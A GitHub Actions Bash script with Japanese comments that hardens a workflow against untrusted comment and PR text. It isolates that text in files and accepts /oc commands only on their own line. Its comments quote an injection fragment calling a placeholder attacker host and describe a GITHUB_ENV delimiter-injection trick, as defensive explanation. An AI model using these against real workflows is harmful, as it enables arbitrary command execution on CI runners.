#!/bin/bash
# prepare-event-context.sh — untrusted input (issue_comment 本文・PR タイトル/本文・
# workflow_dispatch プロンプト) を「ファイル」に隔離し、後続 step が使うスカラー値だけを
# $GITHUB_ENV に 1 行ずつ書く。
#
# なぜこのスクリプトがあるか (旧実装からの修正点):
#   1. script injection: 旧 workflow は
#        printf '%s' "${{ github.event.comment.body }}" | head -c 20000
#      と run スクリプト中に直接展開していた。${{ }} は shell 実行前にランナーが文字列
#      置換するので、repo が public である以上「issue にコメントできる全員」が
#      `"; curl attacker/... ; echo "` のような断片を仕込んで任意コマンドを実行できた。
#      ここでは untrusted 値を一切 env 経由で受け取らない。jq が $GITHUB_EVENT_PATH を
#      直接読むので、shell には渡らない。
#   2. env 変数注入: 旧実装は
#        echo "COMMENT_BODY<<OCCTXEOF" ... echo "OCCTXEOF"
#      と $GITHUB_ENV に heredoc で本文を載せていた。本文中に OCCTXEOF だけの行が
#      あればデリミタが早期終了し、以降の行が環境変数代入として解釈されて
#      PATH を含む任意の env を後続 step に注入できた。本文は必ずファイルに書き出す。
#   3. UTF-8 分断: `head -c 20000` はバイト単位なのでマルチバイト境界を壊しうる。
#      jq の文字列スライス (codepoint 単位) に置き換えた。
#   4. コマンド判定: 旧 workflow の `contains(body, '/oc')` は部分一致なので
#      `.../ocean/...` や URL 内の `/oc/` でも発火する。行頭アンカーの正規表現に
#      置き換えた。job の if: は粗い前筛选に留まり、確定判定はここが正本。
set -euo pipefail

: "${GITHUB_EVENT_PATH:?GITHUB_EVENT_PATH is not set}"
: "${RUNNER_TEMP:?RUNNER_TEMP is not set}"
: "${GITHUB_ENV:?GITHUB_ENV is not set}"
: "${GITHUB_EVENT_NAME:?GITHUB_EVENT_NAME is not set}"

EVENT_NAME="$GITHUB_EVENT_NAME"
COMMENT_FILE="$RUNNER_TEMP/opencode-comment.txt"
PR_TITLE_FILE="$RUNNER_TEMP/opencode-pr-title.txt"
PR_BODY_FILE="$RUNNER_TEMP/opencode-pr-body.txt"
MAX_CHARS="${OC_COMMENT_MAX_CHARS:-20000}"

log() { printf '%s\n' "$*"; }

# ---------------------------------------------------------------- untrusted 本文
# 本文は env 経由でしか受け取らない。${{ }} 展開は actionlint が untrusted として
# 検出するうえ、repo が public なので issue には誰でもコメントできる。
if [ -n "${OC_COMMENT_BODY:-}" ]; then
  comment_body="$OC_COMMENT_BODY"
else
  comment_body="$(jq -r --argjson max "$MAX_CHARS" '
    (.comment.body // .pull_request.body // .inputs.prompt // "")
    | .[0:$max]
  ' "$GITHUB_EVENT_PATH")"
fi

printf '%s' "$comment_body" > "$COMMENT_FILE"
chmod 600 "$COMMENT_FILE"

pr_title="$(jq -r '(.pull_request.title // "") | .[0:500]' "$GITHUB_EVENT_PATH")"
printf '%s' "$pr_title" > "$PR_TITLE_FILE"
chmod 600 "$PR_TITLE_FILE"

pr_body="$(jq -r --argjson max "$MAX_CHARS" '
  (.pull_request.body // "") | .[0:$max]
' "$GITHUB_EVENT_PATH")"
printf '%s' "$pr_body" > "$PR_BODY_FILE"
chmod 600 "$PR_BODY_FILE"

# ---------------------------------------------------------------- コマンド判定
# 行頭 (空白は許容) に /oc または /opencode があり、その後に空白か行末がある行がある
# ときだけ起動する。`/ocean` や URL 内の `/oc/` では発火しない。
#
# 判定をこのスクリプトに置く理由: Actions の式には正規表現がないため、job レベルの
# `if:` は contains() による粗い前筛选に留まらざるを得ない。確定した判定を
# should_run output に出すことで、以降の高コスト step (App トークン発行・checkout・
# agent-setup・opencode 実行) を丸ごとスキップでき、job は緑のままにできる。
COMMAND_RE='^[[:space:]]*/(oc|opencode)([[:space:]]|$)'
should_run=true
if [ "$EVENT_NAME" = issue_comment ] && ! grep -qE "$COMMAND_RE" "$COMMENT_FILE"; then
  log "::notice::no /oc or /opencode command on a line of its own; the agent will not run"
  should_run=false
fi
printf 'should_run=%s\n' "$should_run" >> "${GITHUB_OUTPUT:-/dev/null}"

# ---------------------------------------------------------------- 権限
# 権限の正本は workflow の job-level env 式 (OC_PERMISSION)。ここは値域を検証して
# そのまま後続 step に引き継ぐ。'read' / 'write' 以外の値は受け入れない。
# (式をそのまま再計算して二重に持つと、どちらが正本か分からなくなるため)
permission="${OC_PERMISSION:-}"
case "$permission" in
  read | write) ;;
  *)
    printf '::error::OC_PERMISSION must be "read" or "write", got "%s"\n' "$permission"
    exit 1
    ;;
esac

issue_number="$(jq -r '.issue.number // empty' "$GITHUB_EVENT_PATH")"
pr_number="$(jq -r '.issue.number // .pull_request.number // empty' "$GITHUB_EVENT_PATH")"

# ------------------------------------------------------- $GITHUB_ENV への書き込み
# ここから下は「1 行の値」しか書かない。複数行・heredoc・untrusted 本文は書かない。
{
  printf 'OC_EVENT_NAME=%s\n' "$EVENT_NAME"
  printf 'OC_PERMISSION=%s\n' "$permission"
  printf 'OC_COMMENT_FILE=%s\n' "$COMMENT_FILE"
  printf 'OC_PR_TITLE_FILE=%s\n' "$PR_TITLE_FILE"
  printf 'OC_PR_BODY_FILE=%s\n' "$PR_BODY_FILE"
  printf 'OC_ISSUE_NUMBER=%s\n' "$issue_number"
  printf 'OC_PR_NUMBER=%s\n' "$pr_number"
  printf 'OC_REPO=%s\n' "${GITHUB_REPOSITORY:-}"
} >> "$GITHUB_ENV"

log "event=$EVENT_NAME permission=$permission issue=${issue_number:-none} pr=${pr_number:-none}"
log "comment=$COMMENT_FILE (${#comment_body} chars, $(wc -c < "$COMMENT_FILE") bytes)"